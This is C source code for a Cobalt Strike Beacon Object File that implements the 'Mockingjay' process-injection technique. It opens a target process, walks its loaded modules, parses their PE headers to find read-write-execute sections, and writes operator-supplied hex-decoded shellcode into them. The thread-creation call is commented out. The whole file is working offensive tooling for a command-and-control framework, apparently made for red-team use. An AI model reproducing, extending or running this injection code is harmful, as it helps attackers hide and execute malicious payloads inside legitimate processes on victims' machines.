#include <windows.h>
#include "beacon.h"
#include <malloc.h>
#include <psapi.h>
#include <stdint.h>


// Author: @scriptchildie  
// email : scriptchildie@protonmail.com

//kernel32
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI BOOL WINAPI KERNEL32$ReadProcessMemory( HANDLE  hProcess, LPCVOID lpBaseAddress,LPVOID  lpBuffer,SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI BOOL WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess,LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

//psapi
WINBASEAPI BOOL WINAPI  PSAPI$EnumProcessModules(HANDLE  hProcess,  HMODULE *lphModule, DWORD   cb,LPDWORD lpcbNeeded);
WINBASEAPI DWORD WINAPI PSAPI$GetModuleFileNameExA(HANDLE  hProcess,HMODULE hModule, LPSTR   lpFilename,DWORD   nSize);
WINBASEAPI DWORD WINAPI PSAPI$GetModuleInformation (HANDLE  hProcess,HMODULE hModule, LPMODULEINFO lpmodinfo,DWORD  cb);

//msvcrt
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);

DWORD strlength(const char * s)
{
    DWORD i = 0;
    while(s[i])
    {
        i++;
    }
    return i;
}
void procInject(HANDLE hProcess, LPVOID rAddress,unsigned char *shc, size_t shclength) {
    HANDLE hProc = NULL;
	SIZE_T bytesWritten;
  
	BOOL success = KERNEL32$WriteProcessMemory(hProcess, rAddress, (PVOID)shc, shclength, &bytesWritten);
    //MSVCRT$free(shc);
	if (success) {
		BeaconPrintf(CALLBACK_OUTPUT, "Success - Shellcode written in memory (%d bytes) . Not Creating Thread...\n", bytesWritten);


        //KERNEL32$CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rAddress, NULL, 0, NULL);
	}

    //BeaconPrintf(CALLBACK_OUTPUT,"!!!!!\n");

}




int64_t findrwx(HANDLE hProcess, LPMODULEINFO minfo) {
    LPVOID lpBuffer  = NULL;
    int64_t absAddr = 0;
    SIZE_T dwNumberOfBytesRead;

    lpBuffer = MSVCRT$malloc(minfo->SizeOfImage);
    if (lpBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT,"Failed to allocate memory.\n");
        return 0;
    }

    KERNEL32$ReadProcessMemory(hProcess, minfo->lpBaseOfDll, lpBuffer, minfo->SizeOfImage, &dwNumberOfBytesRead);
    if (dwNumberOfBytesRead == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,"Failed to read memory.\n");
        return 0;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpBuffer + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &(ntHeaders->OptionalHeader);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    int hasDefaultRWXSection = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++)
    {
        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE &&
            sectionHeader->Characteristics & IMAGE_SCN_MEM_READ &&
            sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            hasDefaultRWXSection = 1;
            break;
        }
    }

    if (hasDefaultRWXSection) {

        absAddr = (int64_t)minfo->lpBaseOfDll + (int64_t)sectionHeader->VirtualAddress;

        BeaconPrintf(CALLBACK_OUTPUT,"Section Name: %.8s\n", sectionHeader->Name);
        BeaconPrintf(CALLBACK_OUTPUT,"Virtual Size: 0x%X\n", sectionHeader->Misc.VirtualSize);
        BeaconPrintf(CALLBACK_OUTPUT,"Virtual Address: 0x%x\n", sectionHeader->VirtualAddress);
        BeaconPrintf(CALLBACK_OUTPUT,"Absolute Address 0x%p\n", absAddr);
        BeaconPrintf(CALLBACK_OUTPUT,"Size of Raw Data: 0x%X\n", sectionHeader->SizeOfRawData);
        BeaconPrintf(CALLBACK_OUTPUT,"Characteristics: 0x%X\n", sectionHeader->Characteristics);
        BeaconPrintf(CALLBACK_OUTPUT,"---------------------------\n");
        MSVCRT$free(lpBuffer);
        return absAddr;
    }

    MSVCRT$free(lpBuffer);
    return absAddr;

        
}


int inMemoryMockingjay(DWORD pid,unsigned char *shc,  size_t shclength) {
    LPVOID rAddress;
	HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ| PROCESS_VM_WRITE|PROCESS_VM_OPERATION, FALSE, pid);
    if (hProcess == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Unable to get a process handle on Process with PID:%d LastError: %d\n",pid, KERNEL32$GetLastError());
        return 1;
    }


    HMODULE* hModules = NULL;
    DWORD cbNeeded;
    DWORD moduleCount;

   if (PSAPI$EnumProcessModules(hProcess, hModules, 0, &cbNeeded)) {
        moduleCount = cbNeeded / sizeof(HMODULE);
        hModules = (HMODULE*)MSVCRT$malloc(moduleCount * sizeof(HMODULE));

        if (hModules != NULL) {
            if (PSAPI$EnumProcessModules(hProcess, hModules, cbNeeded, &cbNeeded)) {

                for (DWORD i = 0; i < moduleCount; i++) {
                    //3. GetModuleFileNameEx
                    TCHAR szModName[MAX_PATH];

                    if (PSAPI$GetModuleFileNameExA(hProcess, hModules[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                        BeaconPrintf(CALLBACK_OUTPUT, "\t--> %s\n", szModName);
                    }
                    
                    MODULEINFO minfo;
                    if (PSAPI$GetModuleInformation(hProcess, hModules[i], &minfo, sizeof(MODULEINFO))) {
                        rAddress = (LPVOID)findrwx(hProcess, &minfo);
                        if (rAddress != NULL) {
                            procInject(hProcess, rAddress, shc, shclength);
                            //BeaconPrintf(CALLBACK_OUTPUT,"HELLO0.\n");


                        }
                        

                    }
                }
            }
           MSVCRT$free(hModules);
        }



    }
    	KERNEL32$CloseHandle(hProcess);
		return 0;
}





// Function to convert a hexadecimal character to its corresponding integer value
int hexCharToInt(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    } else if (c >= 'a' && c <= 'f') {
        return c - 'a' + 10;
    } else if (c >= 'A' && c <= 'F') {
        return c - 'A' + 10;
    }
    return -1; // Invalid character
}

// Function to decode a hexadecimal string into a byte array
// Returns 0 on success, -1 on invalid input, and -2 if the input length is odd
int hexDecodeString(const char* input, unsigned char** output, size_t* outputLen) {
    size_t inputLen = strlength(input);
    
    if (inputLen % 2 != 0) {
        return -2; // Odd-length string
    }
    
    *outputLen = inputLen / 2;
    *output = (unsigned char*)MSVCRT$malloc(*outputLen);
    
    if (*output == NULL) {
        return -1; // Memory allocation failed
    }
    
    for (size_t i = 0; i < *outputLen; i++) {
        int hi = hexCharToInt(input[2 * i]);
        int lo = hexCharToInt(input[2 * i + 1]);
        
        if (hi == -1 || lo == -1) {
            free(*output);
            return -1; // Invalid character in input
        }
        
        (*output)[i] = (unsigned char)((hi << 4) | lo);
    }
    
    return 0; // Success
}




void go(char * args, int len) {
    datap parser;
    DWORD pid;
    char * shc = NULL;
    unsigned char * byteArray = NULL;
    size_t decodedLen;


    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    shc = (char*)BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to print DLLs loaded in remote process with PID: %d\n", pid);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode to inject: %s\n", shc);

    BeaconPrintf(CALLBACK_OUTPUT, "HEX String Length : %d\n", strlength(shc));
    hexDecodeString(shc,&byteArray,&decodedLen);
    //MSVCRT$free(shc);
    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode Length : %d\n", decodedLen);

    inMemoryMockingjay(pid, byteArray, decodedLen);


}